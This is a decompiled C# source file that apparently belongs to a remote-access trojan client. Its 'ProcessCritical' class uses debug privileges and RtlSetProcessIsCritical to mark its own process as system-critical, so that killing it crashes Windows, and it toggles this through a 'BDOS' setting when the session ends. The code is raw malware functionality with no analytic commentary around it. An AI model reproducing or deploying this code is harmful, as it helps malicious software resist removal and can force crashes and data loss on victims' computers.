using System;
using System.Diagnostics;
using System.Threading;
using Microsoft.Win32;

namespace Client.Helper
{
	// Token: 0x0200000D RID: 13
	public static class ProcessCritical
	{
		// Token: 0x0600003E RID: 62 RVA: 0x000021AD File Offset: 0x000003AD
		public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			if (Convert.ToBoolean(Settings.BDOS) && Methods.IsAdmin())
			{
				ProcessCritical.Exit();
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00003BA4 File Offset: 0x00001DA4
		public static void Set()
		{
			try
			{
				SystemEvents.SessionEnding += ProcessCritical.SystemEvents_SessionEnding;
				Process.EnterDebugMode();
				NativeMethods.RtlSetProcessIsCritical(1U, 0U, 0U);
			}
			catch
			{
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00003BEC File Offset: 0x00001DEC
		public static void Exit()
		{
			try
			{
				NativeMethods.RtlSetProcessIsCritical(0U, 0U, 0U);
			}
			catch
			{
				for (;;)
				{
					Thread.Sleep(100000);
				}
			}
		}
	}
}
